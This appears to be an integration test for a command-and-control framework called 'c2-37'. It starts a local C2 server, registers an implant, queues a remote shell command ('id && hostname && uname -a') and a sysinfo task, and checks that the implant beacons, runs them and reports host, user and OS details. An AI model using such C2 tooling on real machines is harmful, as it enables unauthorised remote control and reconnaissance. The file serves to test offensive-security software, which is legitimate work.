"""Quick integration test for c2-37."""
import time
import json
import urllib.request

from c2_37.server import C2Server
from c2_37.implant import Implant

# Start server
server = C2Server(port=8037)
server.start(background=True)
print("[+] Server started on :8037")
time.sleep(0.5)

# Agent registers
agent = Implant("http://127.0.0.1:8037")
ok = agent.register()
print(f"[+] Agent registered: {ok}, id={agent.id}")

# Operator queues a command via API
cmd_data = json.dumps({
    "agent_id": agent.id,
    "type": "shell",
    "args": {"cmd": "id && hostname && uname -a"}
}).encode()
req = urllib.request.Request(
    "http://127.0.0.1:8037/api/cmd",
    data=cmd_data,
    headers={"Content-Type": "application/json"},
)
resp = json.loads(urllib.request.urlopen(req).read())
print(f"[+] Command queued: {resp.get('id', '?')}")

# Queue another command
cmd_data2 = json.dumps({
    "agent_id": agent.id,
    "type": "sysinfo",
    "args": {}
}).encode()
req2 = urllib.request.Request(
    "http://127.0.0.1:8037/api/cmd",
    data=cmd_data2,
    headers={"Content-Type": "application/json"},
)
urllib.request.urlopen(req2)
print("[+] Sysinfo command queued")

# Agent beacons and executes
cmds = agent.beacon()
print(f"[+] Agent received {len(cmds)} commands")
for cmd in cmds:
    result = agent.execute(cmd)
    agent.send_result(result)
    if result.get("stdout"):
        print(f"    shell> {result['stdout'].strip()[:100]}")
    elif result.get("hostname"):
        print(f"    sysinfo> {result['hostname']} / {result['username']} / {result['os']}")

# Check agents via API
resp = json.loads(urllib.request.urlopen("http://127.0.0.1:8037/api/agents").read())
for a in resp["agents"]:
    print(f"[+] Agent: {a['id']} | {a['hostname']} | {a['username']} | {a['os']} | pending={a['pending_commands']}")

# Check results
resp = json.loads(urllib.request.urlopen(f"http://127.0.0.1:8037/api/results/{agent.id}").read())
print(f"[+] Stored results: {len(resp['results'])}")

server.stop()
print("\n[+] c2-37 integration test PASSED")
